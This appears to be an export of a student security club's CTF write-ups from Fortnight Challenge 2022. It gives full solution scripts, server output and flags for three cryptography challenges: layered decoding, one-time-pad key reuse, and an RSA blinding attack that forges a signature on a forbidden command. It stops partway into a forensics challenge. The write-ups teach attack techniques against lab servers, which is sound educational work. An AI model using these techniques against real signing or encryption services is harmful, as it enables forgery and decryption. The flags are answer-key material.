{"name":"write-up","tags":[],"detail":"","list":[{"name":"Fortnight Challenge 2022","tags":["https://img.shields.io/badge/Year-2022-blue.svg","https://img.shields.io/badge/Author-Computer_Security_Club-pink.svg"],"detail":"<h2>FORTNIGHT CHALLENGE 2022</h2>\n<p><img src=\"https://img.shields.io/badge/Year-2022-blue.svg\" alt=\"Year\">\n<img src=\"https://img.shields.io/badge/Author-Computer_Security_Club-pink.svg\" alt=\"Author\"></p>\n<p>Fortnight challenge 2022 là một cuộc thi diễn ra trong 14 ngày liên tục do Computer Security Club - University of Science, VNU - HCM tổ chức với nội dung xoay quanh các kiến thức An toàn thông tin. Đây là một sân chơi bổ ích với mục tiêu đẩy mạnh phong trào nghiên cứu, học tập cũng như nâng cao hiểu biết về an toàn thông tin cho các bạn sinh viên trường đại học Khoa học Tự nhiên</p>\n","list":[{"name":"Cryptography","tags":[],"detail":"","list":[{"name":"Deco de Crypto","tags":["https://img.shields.io/badge/Category-Cryptography-brightgreen.svg","https://img.shields.io/badge/Score_after_CTF-200-blue.svg","https://img.shields.io/badge/Author-SpookyFish%234588-blue.svg","https://img.shields.io/badge/Solves-34-lightgrey.svg"],"detail":"<h2>Fortnight challenge 2022: Deco de Crypto</h2>\n<p><img src=\"https://img.shields.io/badge/Category-Cryptography-brightgreen.svg\" alt=\"warmup category\"><br>\n<img src=\"https://img.shields.io/badge/Score_after_CTF-200-blue.svg\" alt=\"score\"><br>\n<img src=\"https://img.shields.io/badge/Author-SpookyFish%234588-blue.svg\" alt=\"author\"><br>\n<img src=\"https://img.shields.io/badge/Solves-34-lightgrey.svg\" alt=\"solves\"></p>\n<h3>Description</h3>\n<p>My friend Deco de Crypto sent me this and challenged me to find his message. But how am I supposed to crack this code?</p>\n<h3>Hints</h3>\n<ul>\n<li>None</li>\n</ul>\n<h3>Attached files</h3>\n<ul>\n<li><a href=\"https://github.com/compsec-hcmus/hcmus-wu/raw/main/write-up/Fortnight%20Challenge%202022/Cryptography/Deco%20de%20Crypto/encoded\">encoded</a></li>\n</ul>\n<h3>Summary</h3>\n<p>Use base32 decode and base64 decode repeatedly.</p>\n<h3>Detailed solution</h3>\n<p>The challenge looks like it’s the type of challenge that would repeatedly encode the message using various types of encodings. Since we don’t know how many encodings are used, or how many times they are used. Based on the relatively short length of the message, we can guess it may have been encoded with hex, base32, and base64, the three most common encodings.<br>\nWith that in mind, I wrote a script to solve it automatically.</p>\n<pre><code class=\"language-python\"><span class=\"hljs-keyword\">from</span> binascii <span class=\"hljs-keyword\">import</span> unhexlify  \n<span class=\"hljs-keyword\">from</span> string <span class=\"hljs-keyword\">import</span> ascii_lowercase,  ascii_uppercase, digits  \n<span class=\"hljs-keyword\">from</span> base64 <span class=\"hljs-keyword\">import</span> b64decode, b32decode  \na = <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">&quot;encoded&quot;</span>).readline()  \n  \nhex1 = ascii_uppercase+digits  \nhex2 = ascii_lowercase+digits  \nb32 = ascii_uppercase+<span class=\"hljs-string\">&quot;234567=&quot;</span>  \nb64 = ascii_uppercase+ascii_lowercase+digits+<span class=\"hljs-string\">&quot;+/=&quot;</span>  \n  \n<span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">isHex</span>(<span class=\"hljs-params\">a</span>):  \n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">all</span>(i <span class=\"hljs-keyword\">in</span> hex1 <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> a) <span class=\"hljs-keyword\">or</span> <span class=\"hljs-built_in\">all</span>(i <span class=\"hljs-keyword\">in</span> hex2 <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> a)  \n  \n<span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">isBase32</span>(<span class=\"hljs-params\">a</span>):  \n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">all</span>(i <span class=\"hljs-keyword\">in</span> b32 <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> a)  \n  \n<span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">isBase64</span>(<span class=\"hljs-params\">a</span>):  \n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">all</span>(i <span class=\"hljs-keyword\">in</span> b64 <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> a)  \n  \n<span class=\"hljs-keyword\">while</span> <span class=\"hljs-keyword\">not</span> a.startswith(<span class=\"hljs-string\">&quot;f0rtn1ght&quot;</span>):  \n    <span class=\"hljs-keyword\">if</span> isBase32(a):  \n        a = b32decode(a).decode()  \n        <span class=\"hljs-keyword\">continue</span>  \n    <span class=\"hljs-keyword\">if</span> isBase64(a):  \n        a = b64decode(a).decode()  \n        <span class=\"hljs-keyword\">continue</span>  \n    <span class=\"hljs-keyword\">if</span> isHex(a):  \n        a = unhexlify(a).decode()  \n        <span class=\"hljs-keyword\">continue</span>  \n  \n<span class=\"hljs-built_in\">print</span>(a)  \n</code></pre>\n<p>Running it in the console returns the flag:</p>\n<pre><code>f0rtn1ght{n01ce_ba5e5}  \n</code></pre>\n<h3>Flag</h3>\n<pre><code>f0rtn1ght{n01ce_ba5e5}\n</code></pre>\n","list":[]},{"name":"I'll Be Back","tags":["https://img.shields.io/badge/Category-Cryptography-brightgreen.svg","https://img.shields.io/badge/Score_after_CTF-200-blue.svg","https://img.shields.io/badge/Author-SpookyFish%234588-blue.svg","https://img.shields.io/badge/Solves-16-lightgrey.svg"],"detail":"<h2>Fortnight challenge 2022: I’ll Be Back</h2>\n<p><img src=\"https://img.shields.io/badge/Category-Cryptography-brightgreen.svg\" alt=\"warmup category\"><br>\n<img src=\"https://img.shields.io/badge/Score_after_CTF-200-blue.svg\" alt=\"score\"><br>\n<img src=\"https://img.shields.io/badge/Author-SpookyFish%234588-blue.svg\" alt=\"author\"><br>\n<img src=\"https://img.shields.io/badge/Solves-16-lightgrey.svg\" alt=\"solves\"></p>\n<h3>Description</h3>\n<p>Arnold Schwarzenegger left me a message and said Only The Perceptives can understand what it said. Are you a perceptive one?\nUse nc 103.245.249.107 20302 to connect and solve the challenge.</p>\n<h3>Hints</h3>\n<ul>\n<li>None</li>\n</ul>\n<h3>Attached files</h3>\n<ul>\n<li><a href=\"https://raw.githubusercontent.com/compsec-hcmus/hcmus-wu/main/write-up/Fortnight%20Challenge%202022/Cryptography/I'll%20Be%20Back/encrypt.py\">encrypt.py</a></li>\n</ul>\n<h3>Summary</h3>\n<p>It’s a classic one time pad (OTP) challenge.</p>\n<h3>Detailed solution</h3>\n<p>Reading the code, particularly the <code>get_key</code> function, is a good way to get an idea of how to solve the challenge.</p>\n<pre><code class=\"language-python\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">get_key</span>(<span class=\"hljs-params\">self, length</span>):\n    <span class=\"hljs-keyword\">if</span> self.key == <span class=\"hljs-string\">&quot;&quot;</span>:\n        self.key = <span class=\"hljs-string\">&#x27;&#x27;</span>.join(choice(ascii_uppercase + digits) <span class=\"hljs-keyword\">for</span> _ <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(KEY_LENGTH))\n    key_part = <span class=\"hljs-string\">&#x27;&#x27;</span>\n    <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(length):\n        key_part += self.key[(self.key_position + i) % KEY_LENGTH]\n    self.key_position = (self.key_position + length) % KEY_LENGTH\n    <span class=\"hljs-keyword\">return</span> key_part\n</code></pre>\n<p>Here we can spot a potential weakness in the key generation function. Everytime we call <code>get_key</code>, we are just getting a new part of a 6900-character long key. If the part itself is longer than the 6900th character, the key will loop back to the beginning.<br>\nThis is a weakness that we can exploit, because the problem encrypts its flag by xor-ing it with the flag-length part at the beginning of the key. Therefore, to get the flag, we only need to xor the encrypted flag with that particular key part.<br>\nHowever, one bottleneck is that the server only accept 1000 characters at a time, but since we’re communicating in hex, that’s only 500 characters each time, so this require some rudimentary maths to get around.</p>\n<p>With the solution in mind, let’s connect to the server and get the encrypted flag, and set the KEY_LENGTH accordingly.</p>\n<pre><code class=\"language-python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\nconn = remote(<span class=\"hljs-string\">&quot;103.245.249.107&quot;</span>, <span class=\"hljs-number\">20302</span>)\n\nKEY_LENGTH = <span class=\"hljs-number\">6900</span>\n\n<span class=\"hljs-built_in\">print</span>(conn.recvuntil(<span class=\"hljs-string\">&quot;Here is the ecrypted flag:&quot;</span>.encode()).decode())\nencrypted_flag = conn.recvline().decode().strip()\n<span class=\"hljs-built_in\">print</span>(encrypted_flag)\nflag_length = <span class=\"hljs-built_in\">len</span>(encrypted_flag) // <span class=\"hljs-number\">2</span>\n\nKEY_LENGTH -= flag_length\n</code></pre>\n<p>Now we can iteratively send trash data to the server to expend the key until we can loop it back around to the beginning.</p>\n<pre><code class=\"language-python\"><span class=\"hljs-keyword\">while</span> <span class=\"hljs-literal\">True</span>:\n    <span class=\"hljs-built_in\">print</span>(conn.recvuntil(<span class=\"hljs-string\">&quot;Your message: &quot;</span>.encode()).decode())\n    \n    msg_to_send = <span class=\"hljs-string\">&quot;a&quot;</span>*<span class=\"hljs-built_in\">min</span>(<span class=\"hljs-number\">500</span>, KEY_LENGTH)*<span class=\"hljs-number\">2</span>\n    <span class=\"hljs-built_in\">print</span>(msg_to_send)\n    conn.send(msg_to_send.encode())\n\n    <span class=\"hljs-built_in\">print</span>(conn.recvuntil(<span class=\"hljs-string\">&quot;Encrypted message: &quot;</span>.encode()).decode())\n    <span class=\"hljs-built_in\">print</span>(conn.recvuntil(<span class=\"hljs-string\">&quot;\\n&quot;</span>.encode()).strip().decode())\n\n    KEY_LENGTH -= <span class=\"hljs-built_in\">len</span>(msg_to_send) // <span class=\"hljs-number\">2</span>\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;Key length left: &quot;</span>,KEY_LENGTH)\n    <span class=\"hljs-keyword\">if</span> KEY_LENGTH == <span class=\"hljs-number\">0</span>:\n        <span class=\"hljs-keyword\">break</span>\n</code></pre>\n<p>Finally, we send out the encrypted flag to get the flag back.</p>\n<pre><code class=\"language-python\"><span class=\"hljs-built_in\">print</span>(conn.recvuntil(<span class=\"hljs-string\">&quot;Your message: &quot;</span>.encode()).decode())\n<span class=\"hljs-built_in\">print</span>(encrypted_flag)\nconn.send((encrypted_flag + <span class=\"hljs-string\">&quot;\\n&quot;</span>).encode())\n<span class=\"hljs-built_in\">print</span>(conn.recvuntil(<span class=\"hljs-string\">&quot;Encrypted message: &quot;</span>.encode()).decode())\nflag = conn.recvline().decode().strip()\n<span class=\"hljs-built_in\">print</span>(flag)\nconn.close()\n\n<span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;The flag is: &quot;</span> + <span class=\"hljs-built_in\">bytearray</span>.fromhex(flag).decode())\n</code></pre>\n<p>Full script:</p>\n<pre><code class=\"language-python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\nconn = remote(<span class=\"hljs-string\">&quot;103.245.249.107&quot;</span>, <span class=\"hljs-number\">20302</span>)\n\nKEY_LENGTH = <span class=\"hljs-number\">6900</span>\n\n<span class=\"hljs-built_in\">print</span>(conn.recvuntil(<span class=\"hljs-string\">&quot;Here is the ecrypted flag:&quot;</span>.encode()).decode())\nencrypted_flag = conn.recvline().decode().strip()\n<span class=\"hljs-built_in\">print</span>(encrypted_flag)\nflag_length = <span class=\"hljs-built_in\">len</span>(encrypted_flag) // <span class=\"hljs-number\">2</span>\n\nKEY_LENGTH -= flag_length\n\n<span class=\"hljs-keyword\">while</span> <span class=\"hljs-literal\">True</span>:\n    <span class=\"hljs-built_in\">print</span>(conn.recvuntil(<span class=\"hljs-string\">&quot;Your message: &quot;</span>.encode()).decode())\n    \n    msg_to_send = <span class=\"hljs-string\">&quot;a&quot;</span>*<span class=\"hljs-built_in\">min</span>(<span class=\"hljs-number\">500</span>, KEY_LENGTH)*<span class=\"hljs-number\">2</span>\n    <span class=\"hljs-built_in\">print</span>(msg_to_send)\n    conn.send(msg_to_send.encode())\n\n    <span class=\"hljs-built_in\">print</span>(conn.recvuntil(<span class=\"hljs-string\">&quot;Encrypted message: &quot;</span>.encode()).decode())\n    <span class=\"hljs-built_in\">print</span>(conn.recvuntil(<span class=\"hljs-string\">&quot;\\n&quot;</span>.encode()).strip().decode())\n\n    KEY_LENGTH -= <span class=\"hljs-built_in\">len</span>(msg_to_send) // <span class=\"hljs-number\">2</span>\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;Key length left: &quot;</span>,KEY_LENGTH)\n    <span class=\"hljs-keyword\">if</span> KEY_LENGTH == <span class=\"hljs-number\">0</span>:\n        <span class=\"hljs-keyword\">break</span>\n\n<span class=\"hljs-built_in\">print</span>(conn.recvuntil(<span class=\"hljs-string\">&quot;Your message: &quot;</span>.encode()).decode())\n<span class=\"hljs-built_in\">print</span>(encrypted_flag)\nconn.send((encrypted_flag + <span class=\"hljs-string\">&quot;\\n&quot;</span>).encode())\n<span class=\"hljs-built_in\">print</span>(conn.recvuntil(<span class=\"hljs-string\">&quot;Encrypted message: &quot;</span>.encode()).decode())\nflag = conn.recvline().decode().strip()\n<span class=\"hljs-built_in\">print</span>(flag)\nconn.close()\n\n<span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;The flag is: &quot;</span> + <span class=\"hljs-built_in\">bytearray</span>.fromhex(flag).decode())\n</code></pre>\n<p>Running the script in the console gives us the flag.</p>\n<pre><code>[+] Opening connection to 103.245.249.107 on port 20302: Done  \n\nHey! You there! Are you a perceptive one? Let's see.  \nI will give you an encrypted flag, and will even encrypt anything you send me!  \nBut in the future where I came from, we can only read hexadecimal strings, so catch up!  \nCan you find the flag hidden in plain sight?  \n  \nHere is the ecrypted flag:  \n53053e45366b21213b282e7a3e0f383355133b1720344324563b3965252c66783f5c33  \n  \nSend me anything, I will encrypt it for you.  \nYour message:  \n  \n...  \n  \nKey length left:  0  \n  \nSend me anything, I will encrypt it for you.  \nYour message:  \n53053e45366b21213b282e7a3e0f383355133b1720344324563b3965252c66783f5c33  \nEncrypted message:  \n663072746e316768747b7930755f6172655f615f706572636570743176655f306e657d  \n[*] Closed connection to 103.245.249.107 port 20302  \nThe flag is: f0rtn1ght{y0u_are_a_percept1ve_0ne}  \n</code></pre>\n<h3>Flag</h3>\n<pre><code>f0rtn1ght{y0u_are_a_percept1ve_0ne}\n</code></pre>\n","list":[]},{"name":"Really Silly Algorithm","tags":["https://img.shields.io/badge/Category-Cryptography-brightgreen.svg","https://img.shields.io/badge/Score_after_CTF-200-blue.svg","https://img.shields.io/badge/Author-SpookyFish%234588-blue.svg","https://img.shields.io/badge/Solves-9-lightgrey.svg"],"detail":"<h2>Fortnight challenge 2022: Really Silly Algorithm</h2>\n<p><img src=\"https://img.shields.io/badge/Category-Cryptography-brightgreen.svg\" alt=\"warmup category\"><br>\n<img src=\"https://img.shields.io/badge/Score_after_CTF-200-blue.svg\" alt=\"score\"><br>\n<img src=\"https://img.shields.io/badge/Author-SpookyFish%234588-blue.svg\" alt=\"author\"><br>\n<img src=\"https://img.shields.io/badge/Solves-9-lightgrey.svg\" alt=\"solves\"></p>\n<h3>Description</h3>\n<p>I’m making a signing server project to apply for an internship at a bank. I implemented a Really Silly Algorithm, see if you can hack it.\nUse nc 103.245.249.107 20314 to connect and solve the challenge.</p>\n<h3>Hints</h3>\n<ul>\n<li>None</li>\n</ul>\n<h3>Attached files</h3>\n<ul>\n<li><a href=\"https://raw.githubusercontent.com/compsec-hcmus/hcmus-wu/main/write-up/Fortnight%20Challenge%202022/Cryptography/Really%20Silly%20Algorithm/server.py\">server.py</a></li>\n</ul>\n<h3>Summary</h3>\n<p>It’s an RSA challenge that can be solved using the Blinding attack.</p>\n<h3>Detailed solution</h3>\n<p>The challenge itself is quite straight forward, it’s a signing server that can sign our commands, verify our signed commands and execute those commands.<br>\nTracing back from the commands that we can execute, we see that we can get the flag using “peek flag”</p>\n<pre><code class=\"language-python\"><span class=\"hljs-keyword\">if</span> verified_cmd == <span class=\"hljs-string\">&quot;peek flag&quot;</span>:\n    self.send(<span class=\"hljs-string\">&quot;Here is the flag!\\n&quot;</span> + self.flag)\n    <span class=\"hljs-keyword\">break</span>\n</code></pre>\n<p>So the problem is simple, send “peek flag”, get signed, send back the signed command, get flag, get some pizza, enjoy the afternoon.<br>\nBut here’s a catch, the <code>sign</code> function won’t let us sign commands starting with “peek”</p>\n<pre><code class=\"language-python\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">sign</span>(<span class=\"hljs-params\">self, msg</span>):\n    hex_str_of_peek = binascii.hexlify(<span class=\"hljs-string\">&quot;peek&quot;</span>.encode()).decode()\n    <span class=\"hljs-keyword\">if</span> msg.startswith(hex_str_of_peek):\n        <span class=\"hljs-keyword\">return</span> -<span class=\"hljs-number\">1</span>\n    msg = bytes_to_long(binascii.unhexlify(msg.encode()))\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">pow</span>(msg, self.d, self.n)\n</code></pre>\n<p>This elevates the difficulty a bit, but nothing a lil’ math can’t solve.</p>\n<p>Let m = the numerical representation of “peek flag”.<br>\nEssentially, <code>sign</code> will give us C = m^d mod n.<br>\nAnd <code>verify</code> will revert it back to C^e mod n = m^(de) mod n = m mod n.</p>\n<p>But since the server will not sign m, we can sneakily send some m1 such that we can later convert m1 back to m and get it verified.<br>\nThis is where the <strong>Blinding attack</strong> comes in.<br>\nBy this attack, instead of sending m, we can send m1 = m*k^e mod n for some arbitrary k.<br>\nThen when we get back C1 = m1^d mod n = m^d*k^(ed) mod n = m^d*k mod n, we can just divide C1 by k and get C = m^d mod n. We can then send this C value to verify and get the flag.<br>\nOne key thing that we will need is ofcourse the public key, since we need to calculate m1 = m*k^e mod n. Luckily, the server also send us the public key with the “get_pubkey” command.</p>\n<pre><code class=\"language-python\"><span class=\"hljs-keyword\">elif</span> verified_cmd == <span class=\"hljs-string\">&quot;get pubkey&quot;</span>:\n    self.send(<span class=\"hljs-string\">&quot;Here is the public key!\\n&quot;</span> + <span class=\"hljs-built_in\">str</span>(rsa.get_public_key()) + <span class=\"hljs-string\">&quot;\\n&quot;</span>)\n</code></pre>\n<p>With that idea in mind, let’s write some helper functions.</p>\n<pre><code class=\"language-python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\n<span class=\"hljs-keyword\">from</span> binascii <span class=\"hljs-keyword\">import</span> hexlify, unhexlify\n<span class=\"hljs-keyword\">from</span> Crypto.Util.number <span class=\"hljs-keyword\">import</span> bytes_to_long, long_to_bytes, inverse\nconn = remote(<span class=\"hljs-string\">&quot;103.245.249.107&quot;</span>, <span class=\"hljs-number\">20314</span>)\ne = <span class=\"hljs-number\">0x10001</span>\nn = <span class=\"hljs-number\">0</span>\n\n<span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">num_to_hex_str</span>(<span class=\"hljs-params\">num</span>):\n    <span class=\"hljs-keyword\">return</span> binascii.hexlify(long_to_bytes(num)).decode()\n\n<span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">hex_str_to_num</span>(<span class=\"hljs-params\">string</span>):\n    <span class=\"hljs-keyword\">return</span> bytes_to_long(binascii.unhexlify(string.encode()))\n\n<span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">to_sign</span>(<span class=\"hljs-params\">conn, msg, <span class=\"hljs-built_in\">hex</span>=<span class=\"hljs-literal\">False</span></span>):\n    <span class=\"hljs-built_in\">print</span>(conn.recvuntil(<span class=\"hljs-string\">&quot;Your choice: &quot;</span>.encode()).decode())\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;1&quot;</span>)\n    conn.sendline(<span class=\"hljs-string\">&quot;1\\n&quot;</span>.encode())\n    <span class=\"hljs-built_in\">print</span>(conn.recvuntil(<span class=\"hljs-string\">&quot;Command to sign: &quot;</span>.encode()).decode())\n    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">hex</span> == <span class=\"hljs-literal\">False</span>:\n        msg = hexlify(msg.encode()).decode()\n    <span class=\"hljs-built_in\">print</span>(msg)\n    conn.sendline((msg + <span class=\"hljs-string\">&quot;\\n&quot;</span>).encode())\n    <span class=\"hljs-built_in\">print</span>(conn.recvline().decode())\n    signed_cmd = conn.recvline().decode()\n    <span class=\"hljs-built_in\">print</span>(signed_cmd)\n    <span class=\"hljs-keyword\">return</span> signed_cmd\n\n<span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">to_verify</span>(<span class=\"hljs-params\">conn, cmd, get_output=<span class=\"hljs-literal\">False</span></span>):\n    <span class=\"hljs-built_in\">print</span>(conn.recvuntil(<span class=\"hljs-string\">&quot;Your choice: &quot;</span>.encode()).decode())\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;2&quot;</span>)\n    conn.sendline(<span class=\"hljs-string\">&quot;2\\n&quot;</span>.encode())\n    <span class=\"hljs-built_in\">print</span>(conn.recvuntil(<span class=\"hljs-string\">&quot;Command to verify: &quot;</span>.encode()).decode())\n    <span class=\"hljs-built_in\">print</span>(cmd)\n    conn.sendline((cmd + <span class=\"hljs-string\">&quot;\\n&quot;</span>).encode())\n    <span class=\"hljs-built_in\">print</span>(conn.recvline().decode())\n    <span class=\"hljs-keyword\">if</span> get_output == <span class=\"hljs-literal\">True</span>:\n        pubkey = conn.recvline().decode()\n        <span class=\"hljs-built_in\">print</span>(pubkey)\n        <span class=\"hljs-keyword\">return</span> pubkey\n</code></pre>\n<p>And of course, the main action, here I choose k = 5.</p>\n<pre><code class=\"language-python\">signed_cmd = to_sign(conn, <span class=\"hljs-string\">&quot;get pubkey&quot;</span>)\npubkey = to_verify(conn, signed_cmd, <span class=\"hljs-literal\">True</span>)\n\nn = <span class=\"hljs-built_in\">int</span>(pubkey.split(<span class=\"hljs-string\">&quot;, &quot;</span>)[<span class=\"hljs-number\">1</span>][:-<span class=\"hljs-number\">2</span>])\n\ncmd = bytes_to_long(<span class=\"hljs-string\">&quot;peek flag&quot;</span>.encode())\nblinded_cmd = cmd * <span class=\"hljs-built_in\">pow</span>(<span class=\"hljs-number\">5</span>, e, n)\nblinded_cmd = num_to_hex_str(blinded_cmd)\n\nblinded_signed_cmd = to_sign(conn, blinded_cmd, <span class=\"hljs-literal\">True</span>).strip()\n\nblinded_signed_cmd = hex_str_to_num(blinded_signed_cmd)\nblinded_signed_cmd = blinded_signed_cmd * inverse(<span class=\"hljs-number\">5</span>, n) % n\nblinded_signed_cmd = num_to_hex_str(blinded_signed_cmd)\n\nto_verify(conn, blinded_signed_cmd, <span class=\"hljs-literal\">True</span>)\nconn.close()\n</code></pre>\n<p>The full script:</p>\n<pre><code class=\"language-python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\n<span class=\"hljs-keyword\">from</span> binascii <span class=\"hljs-keyword\">import</span> hexlify, unhexlify\n<span class=\"hljs-keyword\">from</span> Crypto.Util.number <span class=\"hljs-keyword\">import</span> bytes_to_long, long_to_bytes, inverse\nconn = remote(<span class=\"hljs-string\">&quot;103.245.249.107&quot;</span>, <span class=\"hljs-number\">20314</span>)\ne = <span class=\"hljs-number\">0x10001</span>\nn = <span class=\"hljs-number\">0</span>\n\n<span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">num_to_hex_str</span>(<span class=\"hljs-params\">num</span>):\n    <span class=\"hljs-keyword\">return</span> binascii.hexlify(long_to_bytes(num)).decode()\n\n<span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">hex_str_to_num</span>(<span class=\"hljs-params\">string</span>):\n    <span class=\"hljs-keyword\">return</span> bytes_to_long(binascii.unhexlify(string.encode()))\n\n<span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">to_sign</span>(<span class=\"hljs-params\">conn, msg, <span class=\"hljs-built_in\">hex</span>=<span class=\"hljs-literal\">False</span></span>):\n    <span class=\"hljs-built_in\">print</span>(conn.recvuntil(<span class=\"hljs-string\">&quot;Your choice: &quot;</span>.encode()).decode())\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;1&quot;</span>)\n    conn.sendline(<span class=\"hljs-string\">&quot;1\\n&quot;</span>.encode())\n    <span class=\"hljs-built_in\">print</span>(conn.recvuntil(<span class=\"hljs-string\">&quot;Command to sign: &quot;</span>.encode()).decode())\n    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">hex</span> == <span class=\"hljs-literal\">False</span>:\n        msg = hexlify(msg.encode()).decode()\n    <span class=\"hljs-built_in\">print</span>(msg)\n    conn.sendline((msg + <span class=\"hljs-string\">&quot;\\n&quot;</span>).encode())\n    <span class=\"hljs-built_in\">print</span>(conn.recvline().decode())\n    signed_cmd = conn.recvline().decode()\n    <span class=\"hljs-built_in\">print</span>(signed_cmd)\n    <span class=\"hljs-keyword\">return</span> signed_cmd\n\n<span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">to_verify</span>(<span class=\"hljs-params\">conn, cmd, get_output=<span class=\"hljs-literal\">False</span></span>):\n    <span class=\"hljs-built_in\">print</span>(conn.recvuntil(<span class=\"hljs-string\">&quot;Your choice: &quot;</span>.encode()).decode())\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;2&quot;</span>)\n    conn.sendline(<span class=\"hljs-string\">&quot;2\\n&quot;</span>.encode())\n    <span class=\"hljs-built_in\">print</span>(conn.recvuntil(<span class=\"hljs-string\">&quot;Command to verify: &quot;</span>.encode()).decode())\n    <span class=\"hljs-built_in\">print</span>(cmd)\n    conn.sendline((cmd + <span class=\"hljs-string\">&quot;\\n&quot;</span>).encode())\n    <span class=\"hljs-built_in\">print</span>(conn.recvline().decode())\n    <span class=\"hljs-keyword\">if</span> get_output == <span class=\"hljs-literal\">True</span>:\n        pubkey = conn.recvline().decode()\n        <span class=\"hljs-built_in\">print</span>(pubkey)\n        <span class=\"hljs-keyword\">return</span> pubkey\n\nsigned_cmd = to_sign(conn, <span class=\"hljs-string\">&quot;get pubkey&quot;</span>)\npubkey = to_verify(conn, signed_cmd, <span class=\"hljs-literal\">True</span>)\n\nn = <span class=\"hljs-built_in\">int</span>(pubkey.split(<span class=\"hljs-string\">&quot;, &quot;</span>)[<span class=\"hljs-number\">1</span>][:-<span class=\"hljs-number\">2</span>])\n\ncmd = bytes_to_long(<span class=\"hljs-string\">&quot;peek flag&quot;</span>.encode())\nblinded_cmd = cmd * <span class=\"hljs-built_in\">pow</span>(<span class=\"hljs-number\">5</span>, e, n)\nblinded_cmd = num_to_hex_str(blinded_cmd)\n\nblinded_signed_cmd = to_sign(conn, blinded_cmd, <span class=\"hljs-literal\">True</span>).strip()\n\nblinded_signed_cmd = hex_str_to_num(blinded_signed_cmd)\nblinded_signed_cmd = blinded_signed_cmd * inverse(<span class=\"hljs-number\">5</span>, n) % n\nblinded_signed_cmd = num_to_hex_str(blinded_signed_cmd)\n\nto_verify(conn, blinded_signed_cmd, <span class=\"hljs-literal\">True</span>)\nconn.close()\n</code></pre>\n<p>Console output:</p>\n<pre><code>[x] Opening connection to 103.245.249.107 on port 20314  \n[x] Opening connection to 103.245.249.107 on port 20314: Trying 103.245.249.107  \n[+] Opening connection to 103.245.249.107 on port 20314: Done  \n  \nWelcome to my supreme signing server!  \nSend me a signed command, I will verify and do it for you, I will also sign your commands, but don't tinker too much with them though!  \nI'm not Blind, I can see through your cunning ruse, sometimes!  \n  \n...  \n  \nCommand to verify:  \n47b6e1c8a9196c1fc77a09ab0a851a62299305ab20122cecb261df5404b5b4bc479ff40be381b98082d2af4ebd3e6e30c32585a37eb50d2211c05ed17379666491fc6b3c56c762e04559ce2854a9cf7b9296614b1ca75c1a58c3cc00b80588fb895f8d32b397356d411dab2c09b4c8376a62952e054f6a1d7c3ac0fb65fb6a939dce86298525eb9aed5d5da11489b108fbce2074f917f0bafd2cb0311f79271409e7bf842f6a0bd9b4cced5c9c736b7a6115317fa2cfc89d2e1255027d8b1c0899b3f0d158ab2ff328db1ac54ba5e706730e67bf1e4b31be4c1600ec9a0a02d5e23190bc74c9f09cffc6338f6df199c46bcf422ce4c777dafcef1e480d11b447  \nHere is the flag!  \n  \nf0rtn1ght{0uch_such_bl1nd1ng_l1ght}  \n</code></pre>\n<h3>Flag</h3>\n<pre><code>f0rtn1ght{0uch_such_bl1nd1ng_l1ght}\n</code></pre>\n","list":[]}]},{"name":"Forensics","tags":[],"detail":"","list":[{"name":"CAPTURE THE FLAG","tags":["https://img.shields.io/badge/Category-Forensics-brightgreen.svg","https://img.shields.io/badge/Score_after_CTF-200-blue.svg","https://img.shields.io/badge/Author-SpookyFish%234588-blue.svg","https://img.shields.io/badge/Solves-6-lightgrey.svg"],"detail":"<h2>Fortnight challenge 2022: CAPTURE THE FLAG</h2>\n<p><img src=\"https://img.shields.io/badge/Category-Forensics-brightgreen.svg\" alt=\"warmup category\"><br>\n<img src=\"https://img.shields.io/badge/Score_after_CTF-200-blue.svg\" alt=\"score\"><br>\n<img src=\"https://img.shields.io/badge/Author-SpookyFish%234588-blue.svg\" alt=\"author\"><br>\n<img src=\"https://img.shields.io/badge/Solves-6-lightgrey.svg\" alt=\"solves\"></p>\n<h3>Description</h3>\n<p>WOW YOU HAVE GONE QUITE A LONG WAY HUH. BUT SO FAR YOU ONLY RELIED ON CAPITAL LETTERS TO GIVE YOU HINTS RIGHT? WELL, THIS TIME, TRY TO LOOK AT THE BIG 